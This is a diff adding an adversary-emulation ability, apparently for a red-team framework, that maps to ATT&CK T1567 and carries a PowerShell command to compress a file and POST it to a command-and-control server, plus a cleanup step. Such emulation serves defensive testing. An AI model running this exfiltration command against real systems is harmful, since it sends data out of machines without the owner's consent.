@@ -1,0 +1,15 @@
+- id: 666e2db4-425c-4565-b01b-69a9da4e1045
+  name: "Exfiltrate File via HTTP"
+  description: "Compress a sensitive file and upload it to the C2 server"
+  tactic: exfiltration
+  technique:
+    attack_id: T1567
+    name: "Exfiltration Over HTTP"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Compress-Archive -Path C:\secret\data.txt -DestinationPath C:\secret\data.zip;
+          Invoke-WebRequest -Uri "#{server}/upload" -Method POST -InFile C:\secret\data.zip;
+        cleanup: |
+          Remove-Item C:\secret\data.zip -Force
